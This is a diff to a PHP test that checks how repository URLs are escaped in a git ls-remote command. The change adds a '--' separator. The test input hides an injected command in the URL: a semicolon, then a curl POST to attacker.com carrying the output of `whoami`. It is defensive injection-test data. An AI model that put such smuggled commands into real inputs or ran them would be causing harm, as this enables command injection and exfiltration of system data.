@@ -58,7 +58,7 @@ it('escapes malicious repository URLs in deploy_key type', function () {
     // Inside the docker `bash -c '...'` wrapper, the URL stays one single-quoted argument,
     // so the semicolon and backticks are never evaluated by either shell
     expect($command)
-        ->toContain("git ls-remote '\\''git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'\\''")
+        ->toContain("git ls-remote -- '\\''git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'\\''")
         ->not->toContain('ls-remote git@github.com');
 });
 
